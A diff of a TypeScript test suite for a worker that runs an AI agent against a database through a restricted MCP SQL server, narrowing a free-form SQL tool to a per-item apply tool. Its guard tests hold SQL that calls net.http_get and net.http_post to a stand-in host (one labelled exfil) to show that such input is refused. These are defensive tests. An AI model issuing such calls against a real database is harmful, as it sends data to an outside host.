@@ -10,7 +10,7 @@ import { createRpc, type ApplyRpc } from '../src/db.js';
 import { runLoop, runPass, type PassDeps } from '../src/loop.js';
 import { HEARTBEAT_MS, startWorker, type WorkerDeps } from '../src/main.js';
 import { MCP_CONFIG_MODE, mcpConfigText, writeMcpConfig } from '../src/mcp-config.js';
-import { ROWS_MAX, TOOLS, callTool, handle, type SqlRunner } from '../src/mcp-sql/rpc.js';
+import { ROWS_MAX, TOOLS, callTool, handle, type ApplyItemInput, type SqlRunner } from '../src/mcp-sql/rpc.js';
 import type { ClaudeOutcome, RunFacts } from '../src/report.js';
 
 const AGENTS = buildAgents('context spec', 'writer rules');
@@ -68,7 +68,7 @@ function initLine(over: Record<string, unknown> = {}): Record<string, unknown> {
     type: 'system', subtype: 'init', claude_code_version: '2.1.289', apiKeySource: 'none', permissionMode: 'dontAsk',
     model: 'claude-sonnet-5-5', session_id: '00000000-0000-4000-8000-000000000001',
     mcp_servers: [{ name: 'db', status: 'connected' }, { name: 'bb2dash', status: 'connected' }],
-    tools: ['Task', 'mcp__db__query', 'mcp__db__execute_sql', 'mcp__bb2dash__search_materials', 'mcp__bb2dash__get_material_text', 'mcp__bb2dash__list_courses'],
+    tools: ['Task', 'mcp__db__query', 'mcp__db__apply_item', 'mcp__bb2dash__search_materials', 'mcp__bb2dash__get_material_text', 'mcp__bb2dash__list_courses'],
     agents: ['general-purpose', CONTEXT_AGENT, WRITER_AGENT],
     skills: ['inbox-apply', 'loop'],
     ...over,
@@ -82,7 +82,7 @@ describe('the CLI arguments', () => {
     expect(args.slice(0, 5)).toEqual(['-p', '--model', 'sonnet', '--tools', 'Agent']);
     expect(JSON.parse(args[args.indexOf('--agents') + 1]!)).toEqual(AGENTS);
     expect(args.slice(args.indexOf('--allowedTools') + 1, args.indexOf('--disallowedTools'))).toEqual([
-      'Agent', 'Task', 'mcp__db__query', 'mcp__db__execute_sql',
+      'Agent', 'Task', 'mcp__db__query', 'mcp__db__apply_item',
       'mcp__bb2dash__search_materials', 'mcp__bb2dash__get_material_text', 'mcp__bb2dash__list_courses',
     ]);
     expect(args.slice(args.indexOf('--disallowedTools') + 1, args.indexOf('--permission-mode'))).toEqual([
@@ -105,8 +105,8 @@ describe('the CLI arguments', () => {
   });
 
   it('the two agents carry the skill files, their own tools and their own models', () => {
-    expect(AGENTS[CONTEXT_AGENT]).toMatchObject({ prompt: 'context spec', model: 'sonnet', tools: expect.not.arrayContaining(['mcp__db__execute_sql']) });
-    expect(AGENTS[WRITER_AGENT]).toMatchObject({ prompt: 'writer rules', model: 'opus', tools: ['mcp__db__query', 'mcp__db__execute_sql'] });
+    expect(AGENTS[CONTEXT_AGENT]).toMatchObject({ prompt: 'context spec', model: 'sonnet', tools: expect.not.arrayContaining(['mcp__db__apply_item']) });
+    expect(AGENTS[WRITER_AGENT]).toMatchObject({ prompt: 'writer rules', model: 'opus', tools: ['mcp__db__query', 'mcp__db__apply_item'] });
     expect(() => buildAgents('', 'x')).toThrow(/empty/);
   });
 });
@@ -122,7 +122,7 @@ describe('the init line', () => {
     ['another permission mode', { permissionMode: 'default' }, /permissionMode is default/],
     ['a missing server', { mcp_servers: [{ name: 'db', status: 'connected' }] }, /not exactly bb2dash and db/],
     ['a server that failed', { mcp_servers: [{ name: 'db', status: 'failed' }, { name: 'bb2dash', status: 'connected' }] }, /db is failed/],
-    ['a missing SQL tool', { tools: ['Task', 'mcp__db__query'] }, /does not hold mcp__db__execute_sql/],
+    ['a missing SQL tool', { tools: ['Task', 'mcp__db__query'] }, /does not hold mcp__db__apply_item/],
     ['a shell tool', { tools: [...(initLine().tools as string[]), 'Bash'] }, /tools holds Bash/],
     ['no skill', { skills: ['loop'] }, /skills does not hold inbox-apply/],
     ['no writer agent', { agents: [CONTEXT_AGENT] }, /agents does not hold inbox-writer/],
@@ -296,21 +296,23 @@ describe('the MCP config', () => {
 
 describe('the SQL server', () => {
   function runner(over: Partial<SqlRunner> = {}) {
-    const calls: string[] = [];
+    const queries: { sql: string; limit: number }[] = [];
+    const items: ApplyItemInput[] = [];
     const r: SqlRunner = {
-      query: async (sql) => {
-        calls.push(`query ${sql}`);
+      query: async (sql, limit) => {
+        queries.push({ sql, limit });
         return { command: 'SELECT', rowCount: 1, rows: [{ n: 1 }] };
       },
-      execute: async (sql) => {
-        calls.push(`execute ${sql}`);
-        return [{ command: 'BEGIN', rowCount: null, rows: [] }, { command: 'UPDATE', rowCount: 1, rows: [] }];
+      applyItem: async (input) => {
+        items.push(input);
+        return { outcome: 'archived', statements: [{ command: 'UPDATE', rowCount: 1, rows: [{ id: 'IST.352/x', component_id: 12 }] }] };
       },
       ...over,
     };
-    return { r, calls };
+    return { r, queries, items };
   }
   const text = (result: Record<string, unknown> | null) => (result?.content as { text: string }[])[0]!.text;
+  const item = { request: 1860, item: 3101, statements: ["update assignments set component_id = 12 where id = 'IST.352/x' returning *"], record: { bucket: 'needs_change', change: 'confirmed', rule: '' } };
 
   it('answers initialize, ping and tools/list, and ignores notifications', async () => {
     const { r } = runner();
@@ -319,43 +321,69 @@ describe('the SQL server', () => {
     });
     expect(await handle({ jsonrpc: '2.0', id: 2, method: 'ping' }, r)).toEqual({ jsonrpc: '2.0', id: 2, result: {} });
     expect(await handle({ jsonrpc: '2.0', id: 3, method: 'tools/list' }, r)).toEqual({ jsonrpc: '2.0', id: 3, result: { tools: TOOLS } });
-    expect(TOOLS.map((t) => t.name)).toEqual(['query', 'execute_sql']);
+    expect(TOOLS.map((t) => t.name)).toEqual(['query', 'apply_item']);
     expect(await handle({ jsonrpc: '2.0', method: 'notifications/initialized' }, r)).toBeNull();
     expect(await handle('not a message', r)).toBeNull();
     expect(await handle({ jsonrpc: '2.0', id: 4, method: 'resources/list' }, r)).toMatchObject({ error: { code: -32601 } });
-    expect(await handle({ jsonrpc: '2.0', id: 5, method: 'tools/call', params: { name: 'drop', arguments: {} } }, r)).toMatchObject({ error: { code: -32602 } });
+    expect(await handle({ jsonrpc: '2.0', id: 5, method: 'tools/call', params: { name: 'execute_sql', arguments: {} } }, r)).toMatchObject({ error: { code: -32602 } });
   });
 
-  it('query runs one read and returns its rows; execute_sql runs the batch', async () => {
-    const { r, calls } = runner();
+  it('query runs one read and asks the database for one row more than it shows', async () => {
+    const { r, queries } = runner();
     const read = await handle({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'query', arguments: { sql: 'select 1 as n' } } }, r);
     expect(JSON.parse(text(read!.result as Record<string, unknown>))).toEqual({ command: 'SELECT', row_count: 1, rows: [{ n: 1 }] });
-    const batch = 'begin; select inbox_apply_begin_item(1, 2); update assignments set title = title; commit;';
-    const wrote = await callTool('execute_sql', { sql: batch }, r);
-    expect(JSON.parse(text(wrote))).toEqual([
-      { command: 'BEGIN', row_count: null, rows: [] },
-      { command: 'UPDATE', row_count: 1, rows: [] },
-    ]);
-    expect(calls).toEqual(['query select 1 as n', `execute ${batch}`]);
+    expect(queries).toEqual([{ sql: 'select 1 as n', limit: ROWS_MAX + 1 }]);
+  });
+
+  it('apply_item hands the item to the runner whole, and says what was written', async () => {
+    const { r, items } = runner();
+    const wrote = await callTool('apply_item', item, r);
+    expect(wrote!.isError).toBe(false);
+    expect(JSON.parse(text(wrote))).toEqual({
+      item: 3101, outcome: 'archived',
+      statements: [{ command: 'UPDATE', row_count: 1, rows: [{ id: 'IST.352/x', component_id: 12 }] }],
+    });
+    expect(items).toEqual([item]);
+  });
+
+  it('an item taken back is skipped, not an error; a record-only item has no statements', async () => {
+    const skipping = runner({ applyItem: async () => ({ outcome: 'skipped' }) });
+    const skipped = await callTool('apply_item', item, skipping.r);
+    expect(skipped!.isError).toBe(false);
+    expect(JSON.parse(text(skipped))).toMatchObject({ item: 3101, outcome: 'skipped' });
+
+    const { r, items } = runner({ applyItem: async () => ({ outcome: 'archived', statements: [] }) });
+    const recordOnly = { ...item, statements: [], record: { bucket: 'dismissed', change: 'recorded only', rule: 'not a real gap' } };
+    expect(JSON.parse(text(await callTool('apply_item', recordOnly, r)))).toEqual({ item: 3101, outcome: 'archived', statements: [] });
+    expect(items).toEqual([]);
   });
 
   it('a text the guard refuses never reaches the database', async () => {
-    const { r, calls } = runner();
+    const { r, queries, items } = runner();
     const refused = await callTool('query', { sql: "select net.http_get('https://x.example')" }, r);
     expect(refused).toMatchObject({ isError: true });
     expect(text(refused)).toMatch(/^refused: sql names the schema net/);
-    expect((await callTool('execute_sql', { sql: 'delete from assignments' }, r))!.isError).toBe(true);
     expect((await callTool('query', {}, r))!.isError).toBe(true);
-    expect(calls).toEqual([]);
+    const exfil = await callTool('apply_item', { ...item, statements: ["update assignments set title = title where net.http_post('https://x.example') > 0"] }, r);
+    expect(text(exfil)).toMatch(/^refused: statement 1: sql names the schema net/);
+    expect(text(await callTool('apply_item', { ...item, statements: ['commit'] }, r))).toMatch(/^refused: statement 1: a write statement is an insert/);
+    expect(text(await callTool('apply_item', { ...item, request: 0 }, r))).toMatch(/^refused: request must be/);
+    expect(queries).toEqual([]);
+    expect(items).toEqual([]);
   });
 
-  it('a database error is a tool result with its SQLSTATE, and long output is cut', async () => {
-    const failing = runner({ execute: async () => { throw Object.assign(new Error('inbox_apply_log_write: a write to assignments must name an answered Inbox item\nCONTEXT: ...'), { code: '42501' }); } });
-    const result = await callTool('execute_sql', { sql: 'update assignments set title = title' }, failing.r);
+  it('a database error is a tool result with its SQLSTATE, and says nothing was written', async () => {
+    const failing = runner({ applyItem: async () => { throw Object.assign(new Error('permission denied for table attention_items\nCONTEXT: ...'), { code: '42501' }); } });
+    const result = await callTool('apply_item', item, failing.r);
     expect(result!.isError).toBe(true);
-    expect(text(result)).toBe('error: inbox_apply_log_write: a write to assignments must name an answered Inbox item (SQLSTATE 42501)');
+    expect(text(result)).toBe('error: permission denied for table attention_items (SQLSTATE 42501); nothing was written for this item');
 
-    const many = runner({ query: async () => ({ command: 'SELECT', rowCount: 500, rows: Array.from({ length: 500 }, (_v, n) => ({ n })) }) });
+    const badQuery = runner({ query: async () => { throw Object.assign(new Error('cannot execute UPDATE in a read-only transaction'), { code: '25006' }); } });
+    expect(text(await callTool('query', { sql: 'select inbox_apply_run_facts(1)' }, badQuery.r))).toBe('error: cannot execute UPDATE in a read-only transaction (SQLSTATE 25006)');
+  });
+
+  it('long output is cut', async () => {
+    const many = runner({ query: async () => ({ command: 'SELECT', rowCount: 201, rows: Array.from({ length: 201 }, (_v, n) => ({ n })) }) });
     const parsed = JSON.parse(text(await callTool('query', { sql: 'select 1' }, many.r)));
     expect(parsed.rows).toHaveLength(ROWS_MAX);
     expect(parsed.rows_cut_at).toBe(ROWS_MAX);
@@ -369,7 +397,7 @@ const NO_FACTS: RunFacts = { archivedIds: [], changedIds: [], unarchivedWrites: 
 const FINISHED: ClaudeOutcome = { exitCode: 0, timedOut: false, costUsd: 0.5, error: null, detail: null };
 
 function queueRow(id: number, over: Record<string, unknown> = {}) {
-  return { id, kind: 'stack_must_confirm', courseId: 'IST.352', ref: `r${id}`, question: `q${id}`, state: 'resolved', accept: null, hasNote: false, wasApplied: false, appliedAt: null, ...over };
+  return { id, kind: 'stack_must_confirm', courseId: 'IST.352', entity: 'assignment', ref: `r${id}`, question: `q${id}`, state: 'resolved', accept: null, hasNote: false, wasApplied: false, appliedAt: null, ...over };
 }
 
 function passDeps(over: { rpc?: Partial<ApplyRpc>; claude?: ClaudeOutcome | (() => Promise<ClaudeOutcome>); maxRunsPerDay?: number } = {}) {
@@ -450,7 +478,8 @@ describe('one pass', () => {
       },
     });
     expect(await runPass(p.deps)).toBe('failed');
-    expect(p.closes[0]).toMatchObject({ state: 'failed', result: { error: 'timed_out', archived: 1, skip: [3, 9], trigger: 'followup' } });
+    // Item 3 was never reached, so only the earlier failure (9) stays in skip.
+    expect(p.closes[0]).toMatchObject({ state: 'failed', result: { error: 'timed_out', archived: 1, skip: [9], trigger: 'followup' } });
   });
 
   it("one templated row's refusal does not stop the request, and a row taken back is only noted", async () => {
@@ -473,8 +502,24 @@ describe('one pass', () => {
   it('a throw after the claim still closes the request, failed', async () => {
     const p = passDeps({ rpc: { prepare: async () => { throw new Error('connection terminated'); } } });
     expect(await runPass(p.deps)).toBe('failed');
-    expect(p.closes[0]).toMatchObject({ id: 1860, state: 'failed', result: { error: 'cli_error', archived: 0 } });
+    expect(p.closes[0]).toMatchObject({ id: 1860, state: 'failed', result: { error: 'cli_error', archived: 0, claude: { started: false } } });
     expect(p.lines.some((l) => l.includes('request 1860 failed: connection terminated'))).toBe(true);
+  });
+
+  it('a throw after Claude ran still counts the run and what it archived, so the rest is followed up', async () => {
+    let factsCalls = 0;
+    const p = passDeps({
+      rpc: {
+        prepare: async () => ({ queue: [queueRow(2), queueRow(3)], runsToday: 0, skip: [], trigger: 'sync' }),
+        runFacts: async () => {
+          factsCalls += 1;
+          if (factsCalls === 1) throw new Error('connection terminated');
+          return { ...NO_FACTS, archivedIds: [2], changedIds: [2], leftIds: [3] };
+        },
+      },
+    });
+    expect(await runPass(p.deps)).toBe('failed');
+    expect(p.closes[0]).toMatchObject({ state: 'failed', result: { error: 'cli_error', archived: 1, claude: { started: true } } });
   });
 
   it('when even the close cannot be made, the pass says the next claim releases it', async () => {
